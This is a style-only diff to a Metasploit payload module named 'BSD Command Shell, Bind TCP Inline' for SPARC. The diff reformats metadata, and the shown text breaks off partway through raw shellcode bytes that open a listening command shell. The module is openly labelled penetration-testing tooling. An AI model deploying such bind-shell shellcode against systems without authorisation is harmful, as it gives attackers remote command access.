@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 164
 
   include Msf::Payload::Single
@@ -13,19 +11,23 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'BSD Command Shell, Bind TCP Inline',
-      'Description'   => 'Listen for a connection and spawn a command shell',
-      'Author'        => 'vlad902',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'bsd',
-      'Arch'          => ARCH_SPARC,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell))
+    super(
+      merge_info(
+        info,
+        'Name' => 'BSD Command Shell, Bind TCP Inline',
+        'Description' => 'Listen for a connection and spawn a command shell',
+        'Author' => 'vlad902',
+        'License' => MSF_LICENSE,
+        'Platform' => 'bsd',
+        'Arch' => ARCH_SPARC,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell
+      )
+    )
   end
 
   def generate
-    port    = (datastore['RPORT'] || 0).to_i
+    port = (datastore['RPORT'] || 0).to_i
     payload =
       "\x9c\x2b\xa0\x07\x94\x1a\xc0\x0b\x92\x10\x20\x01\x90\x10\x20\x02" +
       "\x82\x10\x20\x61\x91\xd0\x20\x08\xd0\x23\xbf\xf8" +
